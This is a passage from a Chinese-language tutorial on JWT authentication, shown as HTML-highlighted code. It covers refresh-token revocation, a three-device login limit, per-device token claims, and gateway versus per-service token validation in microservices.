</span><span id="__span-95-6"><a id="__codelineno-95-6" name="__codelineno-95-6" href="#__codelineno-95-6"></a><span class="w">    </span><span class="n">refreshTokenRepository</span><span class="p">.</span><span class="na">revokeAllByUserId</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="na">getId</span><span class="p">());</span>
</span><span id="__span-95-7"><a id="__codelineno-95-7" name="__codelineno-95-7" href="#__codelineno-95-7"></a>
</span><span id="__span-95-8"><a id="__codelineno-95-8" name="__codelineno-95-8" href="#__codelineno-95-8"></a><span class="w">    </span><span class="c1">// 3. 生成新Token</span>
</span><span id="__span-95-9"><a id="__codelineno-95-9" name="__codelineno-95-9" href="#__codelineno-95-9"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">accessToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">generateAccessToken</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
</span><span id="__span-95-10"><a id="__codelineno-95-10" name="__codelineno-95-10" href="#__codelineno-95-10"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">refreshToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">generateRefreshToken</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="w"> </span><span class="n">deviceId</span><span class="p">);</span>
</span><span id="__span-95-11"><a id="__codelineno-95-11" name="__codelineno-95-11" href="#__codelineno-95-11"></a>
</span><span id="__span-95-12"><a id="__codelineno-95-12" name="__codelineno-95-12" href="#__codelineno-95-12"></a><span class="w">    </span><span class="c1">// 4. 保存新Refresh Token</span>
</span><span id="__span-95-13"><a id="__codelineno-95-13" name="__codelineno-95-13" href="#__codelineno-95-13"></a><span class="w">    </span><span class="n">saveRefreshToken</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="na">getId</span><span class="p">(),</span><span class="w"> </span><span class="n">refreshToken</span><span class="p">,</span><span class="w"> </span><span class="n">deviceId</span><span class="p">);</span>
</span><span id="__span-95-14"><a id="__codelineno-95-14" name="__codelineno-95-14" href="#__codelineno-95-14"></a>
</span><span id="__span-95-15"><a id="__codelineno-95-15" name="__codelineno-95-15" href="#__codelineno-95-15"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">accessToken</span><span class="p">;</span>
</span><span id="__span-95-16"><a id="__codelineno-95-16" name="__codelineno-95-16" href="#__codelineno-95-16"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong>场景2：多设备登录（限制数量）</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">deviceId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-96-2"><a id="__codelineno-96-2" name="__codelineno-96-2" href="#__codelineno-96-2"></a><span class="w">    </span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authenticate</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">);</span>
</span><span id="__span-96-3"><a id="__codelineno-96-3" name="__codelineno-96-3" href="#__codelineno-96-3"></a>
</span><span id="__span-96-4"><a id="__codelineno-96-4" name="__codelineno-96-4" href="#__codelineno-96-4"></a><span class="w">    </span><span class="c1">// 获取用户当前活跃设备数</span>
</span><span id="__span-96-5"><a id="__codelineno-96-5" name="__codelineno-96-5" href="#__codelineno-96-5"></a><span class="w">    </span><span class="n">List</span><span class="o">&lt;</span><span class="n">RefreshToken</span><span class="o">&gt;</span><span class="w"> </span><span class="n">activeTokens</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">refreshTokenRepository</span>
</span><span id="__span-96-6"><a id="__codelineno-96-6" name="__codelineno-96-6" href="#__codelineno-96-6"></a><span class="w">        </span><span class="p">.</span><span class="na">findActiveByUserId</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="na">getId</span><span class="p">());</span>
</span><span id="__span-96-7"><a id="__codelineno-96-7" name="__codelineno-96-7" href="#__codelineno-96-7"></a>
</span><span id="__span-96-8"><a id="__codelineno-96-8" name="__codelineno-96-8" href="#__codelineno-96-8"></a><span class="w">    </span><span class="c1">// 限制最多3个设备同时登录</span>
</span><span id="__span-96-9"><a id="__codelineno-96-9" name="__codelineno-96-9" href="#__codelineno-96-9"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">activeTokens</span><span class="p">.</span><span class="na">size</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-96-10"><a id="__codelineno-96-10" name="__codelineno-96-10" href="#__codelineno-96-10"></a><span class="w">        </span><span class="c1">// 撤销最早登录的设备</span>
</span><span id="__span-96-11"><a id="__codelineno-96-11" name="__codelineno-96-11" href="#__codelineno-96-11"></a><span class="w">        </span><span class="n">RefreshToken</span><span class="w"> </span><span class="n">oldest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">activeTokens</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span id="__span-96-12"><a id="__codelineno-96-12" name="__codelineno-96-12" href="#__codelineno-96-12"></a><span class="w">        </span><span class="n">oldest</span><span class="p">.</span><span class="na">setRevoked</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
</span><span id="__span-96-13"><a id="__codelineno-96-13" name="__codelineno-96-13" href="#__codelineno-96-13"></a><span class="w">        </span><span class="n">refreshTokenRepository</span><span class="p">.</span><span class="na">save</span><span class="p">(</span><span class="n">oldest</span><span class="p">);</span>
</span><span id="__span-96-14"><a id="__codelineno-96-14" name="__codelineno-96-14" href="#__codelineno-96-14"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-96-15"><a id="__codelineno-96-15" name="__codelineno-96-15" href="#__codelineno-96-15"></a>
</span><span id="__span-96-16"><a id="__codelineno-96-16" name="__codelineno-96-16" href="#__codelineno-96-16"></a><span class="w">    </span><span class="c1">// 生成新Token</span>
</span><span id="__span-96-17"><a id="__codelineno-96-17" name="__codelineno-96-17" href="#__codelineno-96-17"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">generateTokens</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="w"> </span><span class="n">deviceId</span><span class="p">);</span>
</span><span id="__span-96-18"><a id="__codelineno-96-18" name="__codelineno-96-18" href="#__codelineno-96-18"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong>场景3：不同设备不同权限</strong></p>
<div class="language-json highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a><span class="c1">// 移动设备Token</span>
</span><span id="__span-97-2"><a id="__codelineno-97-2" name="__codelineno-97-2" href="#__codelineno-97-2"></a><span class="p">{</span>
</span><span id="__span-97-3"><a id="__codelineno-97-3" name="__codelineno-97-3" href="#__codelineno-97-3"></a><span class="w">  </span><span class="nt">&quot;sub&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user-123&quot;</span><span class="p">,</span>
</span><span id="__span-97-4"><a id="__codelineno-97-4" name="__codelineno-97-4" href="#__codelineno-97-4"></a><span class="w">  </span><span class="nt">&quot;device_type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mobile&quot;</span><span class="p">,</span>
</span><span id="__span-97-5"><a id="__codelineno-97-5" name="__codelineno-97-5" href="#__codelineno-97-5"></a><span class="w">  </span><span class="nt">&quot;device_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;iPhone-12-abc&quot;</span><span class="p">,</span>
</span><span id="__span-97-6"><a id="__codelineno-97-6" name="__codelineno-97-6" href="#__codelineno-97-6"></a><span class="w">  </span><span class="nt">&quot;roles&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;user&quot;</span><span class="p">],</span>
</span><span id="__span-97-7"><a id="__codelineno-97-7" name="__codelineno-97-7" href="#__codelineno-97-7"></a><span class="w">  </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;write&quot;</span><span class="p">],</span>
</span><span id="__span-97-8"><a id="__codelineno-97-8" name="__codelineno-97-8" href="#__codelineno-97-8"></a><span class="w">  </span><span class="nt">&quot;exp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735775400</span><span class="w">  </span><span class="c1">// 7天</span>
</span><span id="__span-97-9"><a id="__codelineno-97-9" name="__codelineno-97-9" href="#__codelineno-97-9"></a><span class="p">}</span>
</span><span id="__span-97-10"><a id="__codelineno-97-10" name="__codelineno-97-10" href="#__codelineno-97-10"></a>
</span><span id="__span-97-11"><a id="__codelineno-97-11" name="__codelineno-97-11" href="#__codelineno-97-11"></a><span class="c1">// Web设备Token</span>
</span><span id="__span-97-12"><a id="__codelineno-97-12" name="__codelineno-97-12" href="#__codelineno-97-12"></a><span class="p">{</span>
</span><span id="__span-97-13"><a id="__codelineno-97-13" name="__codelineno-97-13" href="#__codelineno-97-13"></a><span class="w">  </span><span class="nt">&quot;sub&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user-123&quot;</span><span class="p">,</span>
</span><span id="__span-97-14"><a id="__codelineno-97-14" name="__codelineno-97-14" href="#__codelineno-97-14"></a><span class="w">  </span><span class="nt">&quot;device_type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;web&quot;</span><span class="p">,</span>
</span><span id="__span-97-15"><a id="__codelineno-97-15" name="__codelineno-97-15" href="#__codelineno-97-15"></a><span class="w">  </span><span class="nt">&quot;device_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;browser-session-xyz&quot;</span><span class="p">,</span>
</span><span id="__span-97-16"><a id="__codelineno-97-16" name="__codelineno-97-16" href="#__codelineno-97-16"></a><span class="w">  </span><span class="nt">&quot;roles&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;user&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">],</span><span class="w">  </span><span class="c1">// Web端有admin权限</span>
</span><span id="__span-97-17"><a id="__codelineno-97-17" name="__codelineno-97-17" href="#__codelineno-97-17"></a><span class="w">  </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;write&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;delete&quot;</span><span class="p">],</span>
</span><span id="__span-97-18"><a id="__codelineno-97-18" name="__codelineno-97-18" href="#__codelineno-97-18"></a><span class="w">  </span><span class="nt">&quot;exp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735686900</span><span class="w">  </span><span class="c1">// 15分钟</span>
</span><span id="__span-97-19"><a id="__codelineno-97-19" name="__codelineno-97-19" href="#__codelineno-97-19"></a><span class="p">}</span>
</span></code></pre></div>
<h3 id="27-jwt在微服务中的应用">2.7 JWT在微服务中的应用<a class="headerlink" href="#27-jwt在微服务中的应用" title="链接到此标题">&para;</a></h3>
<p><strong>架构模式：</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>                            ┌─────────────────┐
</span><span id="__span-98-2"><a id="__codelineno-98-2" name="__codelineno-98-2" href="#__codelineno-98-2"></a>                            │   API Gateway   │
</span><span id="__span-98-3"><a id="__codelineno-98-3" name="__codelineno-98-3" href="#__codelineno-98-3"></a>                            │  (Token验证)    │
</span><span id="__span-98-4"><a id="__codelineno-98-4" name="__codelineno-98-4" href="#__codelineno-98-4"></a>                            └────────┬────────┘
</span><span id="__span-98-5"><a id="__codelineno-98-5" name="__codelineno-98-5" href="#__codelineno-98-5"></a>                                     │
</span><span id="__span-98-6"><a id="__codelineno-98-6" name="__codelineno-98-6" href="#__codelineno-98-6"></a>                ┌────────────────────┼────────────────────┐
</span><span id="__span-98-7"><a id="__codelineno-98-7" name="__codelineno-98-7" href="#__codelineno-98-7"></a>                │                    │                    │
</span><span id="__span-98-8"><a id="__codelineno-98-8" name="__codelineno-98-8" href="#__codelineno-98-8"></a>         ┌──────▼──────┐      ┌─────▼─────┐      ┌──────▼──────┐
</span><span id="__span-98-9"><a id="__codelineno-98-9" name="__codelineno-98-9" href="#__codelineno-98-9"></a>         │ User Service│      │Order Service│      │Product Service│
</span><span id="__span-98-10"><a id="__codelineno-98-10" name="__codelineno-98-10" href="#__codelineno-98-10"></a>         │  (验证Token)│      │  (验证Token)│      │  (验证Token)│
</span><span id="__span-98-11"><a id="__codelineno-98-11" name="__codelineno-98-11" href="#__codelineno-98-11"></a>         └─────────────┘      └─────────────┘      └─────────────┘
</span></code></pre></div>
<p><strong>方案1：网关统一验证（推荐）</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a><span class="cm">/**</span>
</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a><span class="cm"> * API网关Token验证</span>
</span><span id="__span-99-3"><a id="__codelineno-99-3" name="__codelineno-99-3" href="#__codelineno-99-3"></a><span class="cm"> */</span>
</span><span id="__span-99-4"><a id="__codelineno-99-4" name="__codelineno-99-4" href="#__codelineno-99-4"></a><span class="nd">@Component</span>
</span><span id="__span-99-5"><a id="__codelineno-99-5" name="__codelineno-99-5" href="#__codelineno-99-5"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JWTGatewayFilter</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">GlobalFilter</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-99-6"><a id="__codelineno-99-6" name="__codelineno-99-6" href="#__codelineno-99-6"></a>
</span><span id="__span-99-7"><a id="__codelineno-99-7" name="__codelineno-99-7" href="#__codelineno-99-7"></a><span class="w">    </span><span class="nd">@Override</span>
</span><span id="__span-99-8"><a id="__codelineno-99-8" name="__codelineno-99-8" href="#__codelineno-99-8"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Mono</span><span class="o">&lt;</span><span class="n">Void</span><span class="o">&gt;</span><span class="w"> </span><span class="nf">filter</span><span class="p">(</span><span class="n">ServerWebExchange</span><span class="w"> </span><span class="n">exchange</span><span class="p">,</span><span class="w"> </span><span class="n">GatewayFilterChain</span><span class="w"> </span><span class="n">chain</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-99-9"><a id="__codelineno-99-9" name="__codelineno-99-9" href="#__codelineno-99-9"></a><span class="w">        </span><span class="c1">// 1. 提取Token</span>
</span><span id="__span-99-10"><a id="__codelineno-99-10" name="__codelineno-99-10" href="#__codelineno-99-10"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">extractToken</span><span class="p">(</span><span class="n">exchange</span><span class="p">.</span><span class="na">getRequest</span><span class="p">());</span>
</span><span id="__span-99-11"><a id="__codelineno-99-11" name="__codelineno-99-11" href="#__codelineno-99-11"></a>
</span><span id="__span-99-12"><a id="__codelineno-99-12" name="__codelineno-99-12" href="#__codelineno-99-12"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">token</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-99-13"><a id="__codelineno-99-13" name="__codelineno-99-13" href="#__codelineno-99-13"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">unauthorized</span><span class="p">(</span><span class="n">exchange</span><span class="p">);</span>
</span><span id="__span-99-14"><a id="__codelineno-99-14" name="__codelineno-99-14" href="#__codelineno-99-14"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-99-15"><a id="__codelineno-99-15" name="__codelineno-99-15" href="#__codelineno-99-15"></a>
</span><span id="__span-99-16"><a id="__codelineno-99-16" name="__codelineno-99-16" href="#__codelineno-99-16"></a><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-99-17"><a id="__codelineno-99-17" name="__codelineno-99-17" href="#__codelineno-99-17"></a><span class="w">            </span><span class="c1">// 2. 验证Token</span>
</span><span id="__span-99-18"><a id="__codelineno-99-18" name="__codelineno-99-18" href="#__codelineno-99-18"></a><span class="w">            </span><span class="n">Claims</span><span class="w"> </span><span class="n">claims</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwtService</span><span class="p">.</span><span class="na">validateToken</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
</span><span id="__span-99-19"><a id="__codelineno-99-19" name="__codelineno-99-19" href="#__codelineno-99-19"></a>
</span><span id="__span-99-20"><a id="__codelineno-99-20" name="__codelineno-99-20" href="#__codelineno-99-20"></a><span class="w">            </span><span class="c1">// 3. 将用户信息传递给下游服务（通过Header）</span>
</span><span id="__span-99-21"><a id="__codelineno-99-21" name="__codelineno-99-21" href="#__codelineno-99-21"></a><span class="w">            </span><span class="n">ServerHttpRequest</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">exchange</span><span class="p">.</span><span class="na">getRequest</span><span class="p">().</span><span class="na">mutate</span><span class="p">()</span>
</span><span id="__span-99-22"><a id="__codelineno-99-22" name="__codelineno-99-22" href="#__codelineno-99-22"></a><span class="w">                </span><span class="p">.</span><span class="na">header</span><span class="p">(</span><span class="s">&quot;X-User-Id&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">claims</span><span class="p">.</span><span class="na">getSubject</span><span class="p">())</span>
</span><span id="__span-99-23"><a id="__codelineno-99-23" name="__codelineno-99-23" href="#__codelineno-99-23"></a><span class="w">                </span><span class="p">.</span><span class="na">header</span><span class="p">(</span><span class="s">&quot;X-User-Roles&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">join</span><span class="p">(</span><span class="s">&quot;,&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">claims</span><span class="p">.</span><span class="na">getRoles</span><span class="p">()))</span>
</span><span id="__span-99-24"><a id="__codelineno-99-24" name="__codelineno-99-24" href="#__codelineno-99-24"></a><span class="w">                </span><span class="p">.</span><span class="na">build</span><span class="p">();</span>
</span><span id="__span-99-25"><a id="__codelineno-99-25" name="__codelineno-99-25" href="#__codelineno-99-25"></a>
</span><span id="__span-99-26"><a id="__codelineno-99-26" name="__codelineno-99-26" href="#__codelineno-99-26"></a><span class="w">            </span><span class="c1">// 4. 继续处理</span>
</span><span id="__span-99-27"><a id="__codelineno-99-27" name="__codelineno-99-27" href="#__codelineno-99-27"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">chain</span><span class="p">.</span><span class="na">filter</span><span class="p">(</span><span class="n">exchange</span><span class="p">.</span><span class="na">mutate</span><span class="p">().</span><span class="na">request</span><span class="p">(</span><span class="n">request</span><span class="p">).</span><span class="na">build</span><span class="p">());</span>
</span><span id="__span-99-28"><a id="__codelineno-99-28" name="__codelineno-99-28" href="#__codelineno-99-28"></a>
</span><span id="__span-99-29"><a id="__codelineno-99-29" name="__codelineno-99-29" href="#__codelineno-99-29"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">JwtException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-99-30"><a id="__codelineno-99-30" name="__codelineno-99-30" href="#__codelineno-99-30"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">unauthorized</span><span class="p">(</span><span class="n">exchange</span><span class="p">);</span>
</span><span id="__span-99-31"><a id="__codelineno-99-31" name="__codelineno-99-31" href="#__codelineno-99-31"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-99-32"><a id="__codelineno-99-32" name="__codelineno-99-32" href="#__codelineno-99-32"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-99-33"><a id="__codelineno-99-33" name="__codelineno-99-33" href="#__codelineno-99-33"></a><span class="p">}</span>
</span><span id="__span-99-34"><a id="__codelineno-99-34" name="__codelineno-99-34" href="#__codelineno-99-34"></a>
</span><span id="__span-99-35"><a id="__codelineno-99-35" name="__codelineno-99-35" href="#__codelineno-99-35"></a><span class="cm">/**</span>
</span><span id="__span-99-36"><a id="__codelineno-99-36" name="__codelineno-99-36" href="#__codelineno-99-36"></a><span class="cm"> * 下游微服务从Header获取用户信息</span>
</span><span id="__span-99-37"><a id="__codelineno-99-37" name="__codelineno-99-37" href="#__codelineno-99-37"></a><span class="cm"> */</span>
</span><span id="__span-99-38"><a id="__codelineno-99-38" name="__codelineno-99-38" href="#__codelineno-99-38"></a><span class="nd">@RestController</span>
</span><span id="__span-99-39"><a id="__codelineno-99-39" name="__codelineno-99-39" href="#__codelineno-99-39"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">UserController</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-99-40"><a id="__codelineno-99-40" name="__codelineno-99-40" href="#__codelineno-99-40"></a>
</span><span id="__span-99-41"><a id="__codelineno-99-41" name="__codelineno-99-41" href="#__codelineno-99-41"></a><span class="w">    </span><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&quot;/api/user/profile&quot;</span><span class="p">)</span>
</span><span id="__span-99-42"><a id="__codelineno-99-42" name="__codelineno-99-42" href="#__codelineno-99-42"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">UserProfile</span><span class="w"> </span><span class="nf">getProfile</span><span class="p">(</span>
</span><span id="__span-99-43"><a id="__codelineno-99-43" name="__codelineno-99-43" href="#__codelineno-99-43"></a><span class="w">        </span><span class="nd">@RequestHeader</span><span class="p">(</span><span class="s">&quot;X-User-Id&quot;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">userId</span><span class="p">,</span>
</span><span id="__span-99-44"><a id="__codelineno-99-44" name="__codelineno-99-44" href="#__codelineno-99-44"></a><span class="w">        </span><span class="nd">@RequestHeader</span><span class="p">(</span><span class="s">&quot;X-User-Roles&quot;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">roles</span>
</span><span id="__span-99-45"><a id="__codelineno-99-45" name="__codelineno-99-45" href="#__codelineno-99-45"></a><span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-99-46"><a id="__codelineno-99-46" name="__codelineno-99-46" href="#__codelineno-99-46"></a><span class="w">        </span><span class="c1">// 直接使用用户信息，无需再次验证Token</span>
</span><span id="__span-99-47"><a id="__codelineno-99-47" name="__codelineno-99-47" href="#__codelineno-99-47"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">userService</span><span class="p">.</span><span class="na">getProfile</span><span class="p">(</span><span class="n">userId</span><span class="p">);</span>
</span><span id="__span-99-48"><a id="__codelineno-99-48" name="__codelineno-99-48" href="#__codelineno-99-48"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-99-49"><a id="__codelineno-99-49" name="__codelineno-99-49" href="#__codelineno-99-49"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong>方案2：每个服务独立验证（高安全要求）</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a><span class="cm">/**</span>
</span><span id="__span-100-2"><a id="__codelineno-100-2" name="__codelineno-100-2" href="#__codelineno-100-2"></a><span class="cm"> * 微服务内部Token验证</span>
</span><span id="__span-100-3"><a id="__codelineno-100-3" name="__codelineno-100-3" href="#__codelineno-100-3"></a><span class="cm"> */</span>
</span><span id="__span-100-4"><a id="__codelineno-100-4" name="__codelineno-100-4" href="#__codelineno-100-4"></a><span class="nd">@Component</span>
</span><span id="__span-100-5"><a id="__codelineno-100-5" name="__codelineno-100-5" href="#__codelineno-100-5"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JWTAuthenticationFilter</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">OncePerRequestFilter</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-100-6"><a id="__codelineno-100-6" name="__codelineno-100-6" href="#__codelineno-100-6"></a>
</span><span id="__span-100-7"><a id="__codelineno-100-7" name="__codelineno-100-7" href="#__codelineno-100-7"></a><span class="w">    </span><span class="nd">@Override</span>
</span><span id="__span-100-8"><a id="__codelineno-100-8" name="__codelineno-100-8" href="#__codelineno-100-8"></a><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilterInternal</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-100-9"><a id="__codelineno-100-9" name="__codelineno-100-9" href="#__codelineno-100-9"></a><span class="w">                                    </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span>
</span><span id="__span-100-10"><a id="__codelineno-100-10" name="__codelineno-100-10" href="#__codelineno-100-10"></a><span class="w">                                    </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">chain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-100-11"><a id="__codelineno-100-11" name="__codelineno-100-11" href="#__codelineno-100-11"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">extractToken</span><span class="p">(</span><span class="n">request</span><span class="p">);</span>
</span><span id="__span-100-12"><a id="__codelineno-100-12" name="__codelineno-100-12" href="#__codelineno-100-12"></a>
</span><span id="__span-100-13"><a id="__codelineno-100-13" name="__codelineno-100-13" href="#__codelineno-100-13"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">token</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-100-14"><a id="__codelineno-100-14" name="__codelineno-100-14" href="#__codelineno-100-14"></a><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-100-15"><a id="__codelineno-100-15" name="__codelineno-100-15" href="#__codelineno-100-15"></a><span class="w">                </span><span class="c1">// 每个服务独立验证Token</span>
</span><span id="__span-100-16"><a id="__codelineno-100-16" name="__codelineno-100-16" href="#__codelineno-100-16"></a><span class="w">                </span><span class="n">Claims</span><span class="w"> </span><span class="n">claims</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwtService</span><span class="p">.</span><span class="na">validateToken</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
</span><span id="__span-100-17"><a id="__codelineno-100-17" name="__codelineno-100-17" href="#__codelineno-100-17"></a>
</span><span id="__span-100-18"><a id="__codelineno-100-18" name="__codelineno-100-18" href="#__codelineno-100-18"></a><span class="w">                </span><span class="c1">// 设置认证上下文</span>
</span><span id="__span-100-19"><a id="__codelineno-100-19" name="__codelineno-100-19" href="#__codelineno-100-19"></a><span class="w">                </span><span class="n">Authentication</span><span class="w"> </span><span class="n">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JWTAuthentication</span><span class="p">(</span><span class="n">claims</span><span class="p">);</span>
</span><span id="__span-100-20"><a id="__codelineno-100-20" name="__codelineno-100-20" href="#__codelineno-100-20"></a><span class="w">                </span><span class="n">SecurityContextHolder</span><span class="p">.</span><span class="na">getContext</span><span class="p">().</span><span class="na">setAuthentication</span><span class="p">(</span><span class="n">auth</span><span class="p">);</span>
</span><span id="__span-100-21"><a id="__codelineno-100-21" name="__codelineno-100-21" href="#__codelineno-100-21"></a>
</span><span id="__span-100-22"><a id="__codelineno-100-22" name="__codelineno-100-22" href="#__codelineno-100-22"></a><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">JwtException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-100-23"><a id="__codelineno-100-23" name="__codelineno-100-23" href="#__codelineno-100-23"></a><span class="w">                </span><span class="c1">// Token无效</span>
</span><span id="__span-100-24"><a id="__codelineno-100-24" name="__codelineno-100-24" href="#__codelineno-100-24"></a><span class="w">            </span><span class="p">}</span>
</span><span id="__span-100-25"><a id="__codelineno-100-25" name="__codelineno-100-25" href="#__codelineno-100-25"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-100-26"><a id="__codelineno-100-26" name="__codelineno-100-26" href="#__codelineno-100-26"></a>
